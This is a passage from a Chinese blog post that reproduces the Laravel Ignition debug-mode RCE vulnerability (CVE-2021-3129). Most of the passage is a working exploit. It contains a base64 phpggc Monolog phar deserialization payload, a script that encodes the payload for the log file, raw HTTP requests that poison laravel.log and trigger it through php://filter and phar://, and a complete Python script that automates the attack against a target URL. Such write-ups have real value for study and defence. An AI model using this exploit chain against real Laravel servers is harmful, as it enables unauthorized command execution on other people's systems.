class="hljs-attribute">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-attribute">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-attribute">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-attribute">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-attribute">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-attribute">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-attribute">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-attribute">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-attribute">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAL7jEYAQA</span><br><span class="hljs-attribute">AAAMfn</span>/YpAEAAAAAAAAIAAAAdGVzdC<span class="hljs-number">50</span>eHQEAAAAL<span class="hljs-number">7</span>jEYAQAAAAMfn/YpAEAAAAAAAB<span class="hljs-number">0</span>ZXN<span class="hljs-number">0</span>dGVz<br><span class="hljs-attribute">dGnV77FlmdRRcxEsm</span>+<span class="hljs-number">4</span>qIqC<span class="hljs-number">01</span>E<span class="hljs-number">8</span>AAgAAAEdCTUI=<br></code></pre></td></tr></table></figure>
<p>我们还需要将以上的payload进行字符集的转换：</p>
<p>这是在网上找的脚本：其中之所以在最终payload前加上<code>AAAAAAAAAAAAAAA</code>是为了解决一个坑点，我在进行复现的时候，发现我们传入的<code>payload</code>会出现在日志文件中三次，其中第三次是不完整的会导致我在对日志文件进行字符集转换的时候出现错误，因此我们需要在payload前填充15个无用字符来避免错误。</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/20.png" srcset="/img/loading.gif"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex<br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQq9AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi</span><br><span class="hljs-string">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-string">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span class="hljs-string">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-string">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-string">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-string">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-string">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-string">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-string">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-string">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-string">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAkYrEYAQA</span><br><span class="hljs-string">AAAMfn/YpAEAAAAAAAAIAAAAdGVzdC50eHQEAAAAkYrEYAQAAAAMfn/YpAEAAAAAAAB0ZXN0dGVz</span><br><span class="hljs-string">dFnC1rdK+he/VojBbla5FVr2USRhAgAAAEdCTUI=&#x27;&#x27;&#x27;</span> <span class="hljs-comment"># base64 payload</span><br>armedPayload = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>    i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()<br>    armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><br>print(<span class="hljs-string">&quot;AAAAAAAAAAAAAAA&quot;</span>+armedPayload)<span class="hljs-comment">#前面加15个字符</span><br></code></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6422<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;AAAAAAAAAAAAAAA=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=39=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6D=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=0A=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=0A=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=0A=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=0A=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=0A=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=79=00=4F=00=69=00=4A=00=70=00=5A=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=0A=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=0A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=0A=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=54=00=61=00=58=00=70=00=6C=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=0A=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=0A=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=0A=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=6B=00=59=00=72=00=45=00=59=00=41=00=51=00=41=00=0A=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=6B=00=59=00=72=00=45=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=64=00=47=00=56=00=7A=00=0A=00=64=00=46=00=6E=00=43=00=31=00=72=00=64=00=4B=00=2B=00=68=00=65=00=2F=00=56=00=6F=00=6A=00=42=00=62=00=6C=00=61=00=35=00=46=00=56=00=72=00=32=00=55=00=53=00=52=00=68=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/22.png" srcset="/img/loading.gif"></p>
<p>将日志文件转化成phar文件。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>326<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/23.png" srcset="/img/loading.gif"></p>
<p>最后利用<code>phar</code>反序列化日志文件（转化之后的）</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>237<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;phar:///home/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log/test.txt&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>成功触发：</p>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/24.png" srcset="/img/loading.gif"></p>
<h1 id="3-利用脚本"><a href="#3-利用脚本" class="headerlink" title="3.利用脚本"></a>3.利用脚本</h1><p>我将日志文件转换成phar文件并进行反序列化操作写成python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment">#首先需要使用phpggc工具生成base64格式的payload：php -d&#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 system ifconfig --phar phar -o php://output | base64</span><br><span class="hljs-comment">#该方法用来将base64的payload进行字符集转换</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CreatePayload</span>():</span><br>    payload = <span class="hljs-string">&#x27;&#x27;&#x27;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQq9AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi</span><br><span class="hljs-string">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-string">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span class="hljs-string">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-string">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-string">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-string">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-string">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-string">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-string">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-string">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-string">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAS8fEYAQA</span><br><span class="hljs-string">AAAMfn/YpAEAAAAAAAAIAAAAdGVzdC50eHQEAAAAS8fEYAQAAAAMfn/YpAEAAAAAAAB0ZXN0dGVz</span><br><span class="hljs-string">dGAgCqgiRkqMTJN8uEIALfT7e2IlAgAAAEdCTUI=&#x27;&#x27;&#x27;</span> <span class="hljs-comment"># base64 payload</span><br>    armedPayload = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>        i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()<br>        armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><br>    lastpayload = <span class="hljs-string">&quot;AAAAAAAAAAAAAAA&quot;</span>+armedPayload<span class="hljs-comment">#前面加15个字符</span><br>    <span class="hljs-keyword">return</span> lastpayload<br><br><span class="hljs-comment">#发送payload到目标</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RequestTarget</span>(<span class="hljs-params">url,viewFileData</span>):</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>    &#125;<br>    payload = &#123;<br>        <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>        <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>        <span class="hljs-string">&quot;viewFile&quot;</span>: viewFileData<br>        &#125;<br>    &#125;<br>    r = requests.post(url,data = json.dumps(payload),headers = headers)<br>    print(r.status_code)<br>    <span class="hljs-keyword">return</span> r.text<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8000/_ignition/execute-solution&quot;</span><br>    clearCommand = <span class="hljs-string">&quot;php://filter/read=consumed/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;</span><br>    putAACommand = <span class="hljs-string">&quot;AA&quot;</span><br>    payload = CreatePayload()<br>    changeLogTopharCmd = <span class="hljs-string">&quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;</span><br>    pharunserialCmd = <span class="hljs-string">&quot;phar:///home/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log/test.txt&quot;</span><br>    <span class="hljs-comment">#清空日志文件</span><br>    RequestTarget(url,clearCommand)<br>    <span class="hljs-comment">#添加AA前缀</span><br>    RequestTarget(url, putAACommand)<br>    <span class="hljs-comment">#写入payload</span><br>    RequestTarget(url, payload)<br>    <span class="hljs-comment">#将日志文件转换成phar格式</span><br>    RequestTarget(url, changeLogTopharCmd)<br>    <span class="hljs-comment">#phar反序列化操作</span><br>    result = RequestTarget(url, pharunserialCmd)<br>    indexof =<span class="hljs-built_in">int</span>(result.find(<span class="hljs-string">&quot;&lt;!doctype html&gt;&quot;</span>)) <br>    print(result[<span class="hljs-number">0</span>:indexof])<br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/25.png" srcset="/img/loading.gif"></p>
<h1 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14702897.html">https://www.cnblogs.com/zpchcbd/p/14702897.html</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
                    
                  </div>
                
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">
                        <span class="hidden-mobile">Java安全-CommonsCollections5利用链分析学习</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    Fluid.utils.waitElementVisible('vcomments', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
          placeholder: "Just go go",
          path: window.location.pathname,
          avatar: "mm",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: false,
          recordIP: false,
          serverURLs: "",
        });
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the
    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
  </noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
